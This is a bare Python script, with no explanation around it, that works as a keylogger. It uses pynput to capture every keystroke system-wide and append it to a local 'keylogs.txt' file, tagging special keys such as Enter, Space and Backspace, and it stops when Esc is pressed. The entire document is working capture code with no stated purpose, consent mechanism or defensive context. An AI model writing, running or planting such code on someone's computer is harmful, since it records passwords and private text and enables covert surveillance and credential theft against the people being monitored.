import pynput
from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            with open("keylogs.txt", "a") as f:
                f.write("[SPACE]")
        elif key == keyboard.Key.enter:
            with open("keylogs.txt", "a") as f:
                f.write("[ENTER]\n")
        elif key == keyboard.Key.backspace:
            with open("keylogs.txt", "a") as f:
                f.write("[BACKSPACE]")
        elif key == keyboard.Key.tab:
            with open("keylogs.txt", "a") as f:
                f.write("[TAB]")
        else:
            with open("keylogs.txt", "a") as f:
                f.write(f"[{key.name.upper()}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()